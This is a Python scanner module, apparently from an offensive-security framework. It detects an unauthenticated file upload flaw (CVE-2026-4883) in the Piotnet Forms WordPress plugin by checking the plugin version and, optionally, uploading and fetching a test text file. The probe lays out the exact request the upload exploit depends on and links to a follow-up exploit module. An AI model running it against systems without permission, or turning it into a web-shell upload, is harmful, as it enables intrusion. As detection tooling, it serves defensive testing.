#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Piotnet Forms <= 2.1.40 unauthenticated upload (CVE-2026-4883)."""

from __future__ import annotations

import json
import re
import secrets

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.protocols.http.wordpress import Wordpress

_VULN_HIGH = (2, 1, 40)
_PLUGIN_SLUGS = ("piotnetforms", "piotnet-addons-for-elementor-pro", "piotnetaddons")


class Module(Scanner, Http_client, Wordpress):
    __info__ = {
        "name": "Piotnet Forms CVE-2026-4883 file upload detect",
        "description": (
            "CVE-2026-4883: piotnetforms_ajax_form_builder accepts unauthenticated "
            "uploads when plugin <= 2.1.40."
        ),
        "author": ["KittySploit Team"],
        "severity": "critical",
        "cve": "CVE-2026-4883",
        "references": [
            "https://nvd.nist.gov/vuln/detail/CVE-2026-4883",
            "https://github.com/projectdiscovery/nuclei-templates/blob/main/http/cves/2026/CVE-2026-4883.yaml",
        ],
        "modules": ["exploits/multi/http/piotnet_forms_cve_2026_4883_upload"],
        "tags": ["web", "scanner", "wordpress", "piotnetforms", "file-upload", "cve-2026-4883"],
        "agent": {
            "risk": "active",
            "approval_required": True,
            "chain": {
                "suggested_followups": ["exploits/multi/http/piotnet_forms_cve_2026_4883_upload"],
            },
        },
    }

    active_probe = OptBool(
        False,
        "Upload .txt proof via admin-ajax and verify on disk (intrusive)",
        required=False,
    )

    def _plugin_version(self) -> tuple[str, str]:
        for slug in _PLUGIN_SLUGS:
            version = self.wp_plugin_version(slug, "/") or ""
            if version:
                return version, slug
            readme = self.http_request(
                method="GET",
                path=f"/wp-content/plugins/{slug}/readme.txt",
                allow_redirects=True,
            )
            if readme and int(readme.status_code) == 200 and "piotnet" in (readme.text or "").lower():
                ver = self.wp_extract_version_from_readme(readme.text or "") or ""
                return ver, slug
        home = self.http_request(method="GET", path="/", allow_redirects=True)
        if home and "piotnetforms" in (home.text or "").lower():
            return "", "piotnetforms"
        return "", ""

    def _upload_probe(self, fname: str) -> bool:
        fields_json = json.dumps(
            [
                {
                    "name": "upload_field",
                    "value": "",
                    "file_name": [f"{fname}.txt"],
                    "attach-files": 0,
                    "type": "file",
                    "image_upload": False,
                    "label": "",
                    "repeater_id": "",
                    "repeater_index": 0,
                    "repeater_label": "",
                }
            ]
        )
        data = {
            "action": "piotnetforms_ajax_form_builder",
            "post_id": "1",
            "form_id": "piotnetforms",
            "fields": fields_json,
            "referrer": "/",
            "remote_ip": "127.0.0.1",
        }
        files = {
            "upload_field[]": (f"{fname}.txt", fname.encode(), "text/plain"),
        }
        post = self.http_request(
            method="POST",
            path="/wp-admin/admin-ajax.php",
            data=data,
            files=files,
            headers={"X-Requested-With": "XMLHttpRequest"},
            allow_redirects=True,
            timeout=40,
        )
        if not post or int(post.status_code) != 200 or '"status":1' not in (post.text or ""):
            return False
        export = self.http_request(
            method="GET",
            path="/wp-admin/admin-ajax.php?action=piotnetforms_export_form_submission",
            allow_redirects=True,
        )
        if not export or int(export.status_code) != 200:
            return False
        body = export.text or ""
        match = re.search(
            rf"(/wp-content/uploads/piotnetforms/files/{re.escape(fname)}-[0-9a-f]{{13}}\.txt)",
            body,
        )
        if not match:
            return False
        upload_path = match.group(1)
        get = self.http_request(method="GET", path=upload_path, allow_redirects=True)
        return bool(get and int(get.status_code) == 200 and fname in (get.text or ""))

    def run(self):
        version, slug = self._plugin_version()
        if not slug:
            return False
        if version and not self.wp_version_in_range(version, (0, 0, 0), _VULN_HIGH):
            return False
        if not self.active_probe:
            self.set_info(
                severity="high",
                cve="CVE-2026-4883",
                reason=(
                    f"Piotnet Forms ({slug}) {version or 'unknown'} in likely affected range; "
                    "upload not verified"
                ),
                version=version or "unknown",
            )
            return True
        fname = secrets.token_hex(3)[:5]
        if not self._upload_probe(fname):
            return False
        self.set_info(
            severity="critical",
            cve="CVE-2026-4883",
            reason="Unauthenticated piotnetforms upload verified with file fetch",
            version=version or "unknown",
            confidence="high",
        )
        return True
